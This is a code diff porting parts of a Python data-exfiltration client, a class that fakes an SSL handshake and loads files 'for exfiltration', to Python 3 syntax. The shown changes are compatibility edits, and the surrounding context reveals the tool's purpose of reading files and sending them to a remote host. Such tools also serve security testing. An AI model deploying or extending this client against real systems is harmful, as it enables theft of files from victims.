@@ -15,6 +15,14 @@ from itertools import izip_longest
 timeout = 2
 socket.setdefaulttimeout(timeout)
 
+if sys.version_info.major == 3:
+    xrange = range
+elif sys.version_info.major == 2:
+    xrange = xrange
+else:
+    # In the distant future, the year 2000...
+    sys.exit()
+
 
 def chunkstring(s, n):
     return [ s[i:i+n] for i in xrange(0, len(s), n) ]
@@ -68,7 +76,7 @@ class HTTPSExfiltrationClient():
         try:
             response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
             html = response.read()
-        except urllib2.URLError, e:
+        except urllib2.URLError as e:
             return 0
         except socket.error as e:
             sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
@@ -144,7 +152,7 @@ class HTTPSExfiltrationClient():
             data = f.read()
             f.close()
             sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
-        except IOError, e:
+        except IOError as e:
             sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
             return 1
 
